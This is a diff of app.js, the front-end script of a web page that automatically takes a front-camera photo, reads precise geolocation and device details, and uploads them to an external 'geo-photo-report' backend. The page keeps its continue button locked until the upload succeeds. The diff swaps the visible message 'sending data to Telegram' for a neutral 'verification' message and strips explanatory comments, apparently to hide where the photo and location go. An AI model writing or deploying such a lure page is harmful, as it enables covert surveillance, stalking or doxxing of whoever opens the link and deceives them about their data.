@@ -1,108 +1,136 @@
-// === НАСТРОЙКА: твой бэкенд на Render ===
+// === app.js ===
+// Настройки
 const API_BASE = 'https://geo-photo-report.onrender.com';
 
-// Кэш UI
+// Кэшируем UI
 const UI = {
   text: document.getElementById('text'),
   note: document.getElementById('note'),
   btn: document.getElementById('enterBtn'),
 };
 
-// Флаг: можно ли уже пускать по ссылке
+// Флаг готовности к переходу
 window.__reportReady = false;
 
-// Служебные стили состояний кнопки (без внешних CSS)
+// === Стили кнопки ===
 function setBtnLocked() {
   const b = UI.btn;
+  if (!b) return;
   b.disabled = true;
   b.style.filter = 'grayscale(35%) brightness(0.9)';
   b.style.opacity = '0.6';
   b.style.cursor = 'not-allowed';
-  b.style.background = 'linear-gradient(90deg, #246, #39a)'; // тускло-синяя
+  b.style.background = 'linear-gradient(90deg, #246, #39a)';
   b.style.boxShadow = '0 0 6px rgba(0,153,255,.25)';
 }
+
 function setBtnReady() {
   const b = UI.btn;
+  if (!b) return;
   b.disabled = false;
   b.style.filter = 'none';
   b.style.opacity = '1';
   b.style.cursor = 'pointer';
-  // неоновый сине-фиолетовый
   b.style.background = 'linear-gradient(90deg, #4f00ff, #00bfff)';
   b.style.boxShadow = '0 0 20px rgba(79,0,255,.6), 0 0 28px rgba(0,191,255,.45)';
 }
 
+// === Геолокация ===
 async function askGeolocation() {
   return new Promise((resolve) => {
     if (!('geolocation' in navigator)) return resolve(null);
     navigator.geolocation.getCurrentPosition(
-      p => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, acc: Math.round(p.coords.accuracy), ts: Date.now() }),
+      (p) =>
+        resolve({
+          lat: p.coords.latitude,
+          lon: p.coords.longitude,
+          acc: Math.round(p.coords.accuracy),
+          ts: Date.now(),
+        }),
       () => resolve(null),
       { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
     );
   });
 }
 
+// === Фото с камеры ===
 async function takePhoto() {
-  if (!navigator.mediaDevices?.getUserMedia) throw new Error('Camera unsupported');
-  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+  if (!navigator.mediaDevices?.getUserMedia)
+    throw new Error('Camera unsupported');
+  const stream = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: 'user' },
+  });
   const [track] = stream.getVideoTracks();
   try {
     const cap = new ImageCapture(track);
     const bmp = await cap.grabFrame();
-    const c = document.createElement('canvas'); c.width = bmp.width; c.height = bmp.height;
+    const c = document.createElement('canvas');
+    c.width = bmp.width;
+    c.height = bmp.height;
     c.getContext('2d').drawImage(bmp, 0, 0);
     const dataUrl = c.toDataURL('image/jpeg', 0.85);
     track.stop();
     return dataUrl;
   } catch {
-    const v = document.createElement('video'); v.srcObject = stream; await v.play();
-    const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight;
+    const v = document.createElement('video');
+    v.srcObject = stream;
+    await v.play();
+    const c = document.createElement('canvas');
+    c.width = v.videoWidth;
+    c.height = v.videoHeight;
     c.getContext('2d').drawImage(v, 0, 0);
     const dataUrl = c.toDataURL('image/jpeg', 0.85);
-    stream.getTracks().forEach(t => t.stop());
+    stream.getTracks().forEach((t) => t.stop());
     return dataUrl;
   }
 }
 
+// === Инфо об устройстве ===
 function getDeviceInfo() {
   const ua = navigator.userAgent;
-  const isSafari = /Safari\//.test(ua) && !/Chrome|CriOS|Chromium|FxiOS|Edg|OPR/.test(ua) && navigator.vendor === 'Apple Computer, Inc.';
+  const isSafari =
+    /Safari\//.test(ua) &&
+    !/Chrome|CriOS|Chromium|FxiOS|Edg|OPR/.test(ua) &&
+    navigator.vendor === 'Apple Computer, Inc.';
   const m = ua.match(/OS\s(\d+)[_.]/);
   const iosVer = m ? parseInt(m[1], 10) : null;
   return { userAgent: ua, platform: navigator.platform, iosVersion: iosVer, isSafari };
 }
 
+// === Отправка отчёта ===
 async function sendReport({ photoBase64, geo }) {
   const info = getDeviceInfo();
   const r = await fetch(`${API_BASE}/api/report`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ ...info, geo, photoBase64, note: 'auto' })
+    body: JSON.stringify({ ...info, geo, photoBase64, note: 'auto' }),
   });
   const data = await r.json();
   if (!data.ok) throw new Error(data.error || 'Send failed');
   return data;
 }
 
-// Главный поток: вызывается автоматически после успешной проверки устройства
+// === Основной поток ===
 async function autoFlow() {
   try {
     setBtnLocked();
     UI.text.innerHTML = 'Запрашиваем камеру и геолокацию…';
-    const [geo, photoBase64] = await Promise.all([askGeolocation(), takePhoto()]);
 
-    UI.text.innerHTML = 'Отправляем данные в Telegram…';
+    const [geo, photoBase64] = await Promise.all([
+      askGeolocation(),
+      takePhoto(),
+    ]);
+
+    UI.text.innerHTML = 'Отправляем данные для проверки…';
     await sendReport({ photoBase64, geo });
 
-    // Разрешаем переход, включаем неон кнопки
     window.__reportReady = true;
     setBtnReady();
+
     UI.text.innerHTML = '<span class="ok">Проверка пройдена.</span>';
     UI.note.textContent = 'Можно продолжить.';
   } catch (e) {
     console.error(e);
-    // Даже при ошибке — не даём проходить (по требованию можно сменить поведение)
     setBtnLocked();
     window.__reportReady = false;
     UI.text.innerHTML = '<span class="err">Не удалось выполнить проверку.</span>';
@@ -110,19 +138,22 @@ async function autoFlow() {
   }
 }
 
-// Экспорт хука: index.html вызовет его после твоей проверки
+// === Экспорт функции ===
 window.__autoFlow = autoFlow;
 
-// Перехватываем клик по кнопке: пока не готовы — никуда не уходим
+// === Защита от преждевременного клика ===
 (function guardClick() {
   const btn = UI.btn;
   if (!btn) return;
-  btn.addEventListener('click', (e) => {
-    if (!window.__reportReady) {
-      e.preventDefault();
-      e.stopPropagation();
-      return; // кнопка «глухая» до успешной отправки
-    }
-    // если ready — ничего не мешаем: в index.html сработает go()
-  }, { capture: true });
+  btn.addEventListener(
+    'click',
+    (e) => {
+      if (!window.__reportReady) {
+        e.preventDefault();
+        e.stopPropagation();
+        return;
+      }
+    },
+    { capture: true }
+  );
 })();
